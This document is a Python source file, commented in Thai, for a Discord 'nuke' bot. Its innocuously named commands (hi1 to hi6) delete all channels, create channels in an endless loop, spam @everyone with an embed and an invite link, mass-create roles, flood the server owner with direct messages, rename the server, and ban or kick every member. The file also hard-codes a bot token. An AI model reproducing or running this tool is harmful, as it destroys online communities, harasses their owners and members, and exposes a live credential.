# ลงเเพก
import discord
from colorama import Fore as color
from discord.ext import commands

# คำสั่งข้อความ
client = commands.Bot(command_prefix=".", intents=discord.Intents.all())

@client.event
async def on_ready():
  # client custom status
  await client.change_presence(activity=discord.Game(name="Roblox"))
  print("Logged in as {}".format(client.user))


# คำสั่งหลักๆ
@client.command(name="hi1", description="nuke the server client has joined")
async def nuke(ctx):
  await ctx.message.delete()
  await ctx.guild.edit(name="ยิงโดยดิส Green hub")

  # ลบช่อง
  try:
    for channels in ctx.guild.channels:
      await channels.delete()
      print("deleted {}".format(channels))
  except:
    print("can't delete {}".format(channels))

  while True:
    await ctx.guild.create_text_channel("Green hub Nuke")


# ปิงสมาชิก
@client.event
async def on_guild_channel_create(channel):
  while True:
    embed = discord.Embed(
        title="Nuked by Green",
        description="Your server has been NUKED by Hi I am Green",
        color=0xFF5733)
    await channel.send("@everyone @here เข้ามาๆ ไม่ติด dualhook เหมือนใครบ้างคน https://discord.gg/7F3D7MGBQT")
    await channel.send(embed=embed)


# เปลียนชื่อยศ/สเเปมมยศ
@client.command(name="hi2", description="spamming a role in the server")
async def rolespam(ctx):
  await ctx.message.delete()
  for _i in range(100):
    await ctx.guild.create_role(name="Green Nuked!")


# สเเปม DM คนสร้างดิส
@client.command(name="hi3",
                description="spamming a text to the server owner")
async def ownerspam(ctx):
  owner = ctx.guild.owner
  while True:
    await owner.send("Opps! Your server has been NUKED by Green Tea King")


# เปลียนชื่อเซิฟเวอร์
@client.command(name="hi4", description="change a guild/server name")
async def guildname(ctx, *, newname):
  await ctx.message.delete()
  await ctx.guild.edit(name=newname)


# เเบนโหด
@client.command(name="hi5", description="massban the member in the server")
async def massban(ctx):
  try:
    for members in ctx.guild.members:
      await members.ban(reason="NUKED BY Green JOIN UP NO THIRD PARTY https://discord.gg/7F3D7MGBQT")
      print(color.GREEN + "banned {}".format(members))
  except:
    print(color.RED + "can't ban {}".format(members))


# เตะสมาชิกโหด
@client.command(name="hi6", description="kickall the member in the server")
async def kickall(ctx):
  try:
    for members in ctx.guild.members:
      await members.kick(reason="NUKED BY Green https://discord.gg/7F3D7MGBQT")
      print(color.GREEN + "kicked {}".format(members))
  except:
    print(color.RED + "can't kick {}".format(members))


# ทำให้บอทรัน
client.run("MTMwNjIzNjY4OTQ0MTg4NjIzOQ.Gapun3.G_vDp931MIMqRizzcjiBBcL0aI9jmUNVn-gNOc")